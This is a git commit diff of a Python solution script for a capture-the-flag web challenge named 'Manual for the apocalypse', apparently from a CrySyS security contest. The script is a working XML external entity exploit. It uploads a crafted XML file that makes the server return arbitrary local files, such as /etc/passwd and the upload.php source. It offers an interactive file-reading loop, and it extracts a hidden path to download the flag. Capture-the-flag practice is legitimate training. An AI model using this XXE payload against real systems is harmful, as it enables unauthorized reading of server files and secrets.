1db49f69ed8f8e82d3168f31607305689207973c
David Nemeth Csoka <encse@csokavar.hu>
2021-04-24 09:13:29 +0200

    x

--- web/manual-for-the-apocalypse/solution/manual-for-the-apocalypse.py
+++ web/manual-for-the-apocalypse/solution/manual-for-the-apocalypse.py
@@ -1,28 +1,48 @@
 import requests
-import base64 
-import readline 
+import base64
+import re
+
+from pyfiglet import Figlet
+from xtermcolor import colorize
 
 
-foo = '/etc/passwd'
-def get(foo):
-
-    st=f'<?xml version="1.0" encoding="UTF-8"?>\n'\
-    f'<!DOCTYPE foo [ \n'\
-    f'    <!ENTITY licenseNumber SYSTEM "file://{foo}"> \n'\
-    f']>\n'\
-    f'<licenseNumber>\n'\
-    f'    `&licenseNumber;`\n'\
-    f'</licenseNumber>\n'
+def read_file(path):
+    st = f'<?xml version="1.0" encoding="UTF-8"?>\n' \
+         f'<!DOCTYPE foo [ \n' \
+         f'    <!ENTITY licenseNumber SYSTEM "file://{path}"> \n' \
+         f']>\n' \
+         f'<licenseNumber>\n' \
+         f'    `&licenseNumber;`\n' \
+         f'</licenseNumber>\n'
 
     files = {'file': ('x.xml', st)}
 
     r = requests.post('https://manual-for-the-apocalypse.secchallenge.crysys.hu/upload.php',
-    files=files)
+                      files=files)
 
-    print(base64.b64decode(r.text).decode("utf-8"))
+    return base64.b64decode(r.text).decode("utf-8")
 
-while True:
-    st = input('>')
-    if st == '':
-        break
-    get(st)
+def shell():
+    while True:
+        st = input('>')
+        if st == '':
+            break
+        print(read_file(st))
+
+
+def solve():
+    print(Figlet(font='slant', width=200).renderText("Manual for the apocalypse"))
+
+    url_base = 'https://manual-for-the-apocalypse.secchallenge.crysys.hu/'
+    print(f'Url base: ' + url_base)
+    print(f'Obtaining source for upload.php...')
+    src = read_file('/var/www/html/upload.php')
+    flag_location = re.search('"(very_secret_hidden_folder.*)"', src).group(1)
+
+    flag_url = f'{url_base}/{flag_location}'
+    print(f'Downloading flag from {flag_url}')
+    flag = requests.get(flag_url).text
+    print('Your flag is: ' + colorize(flag, ansi=2))
+
+
+solve()
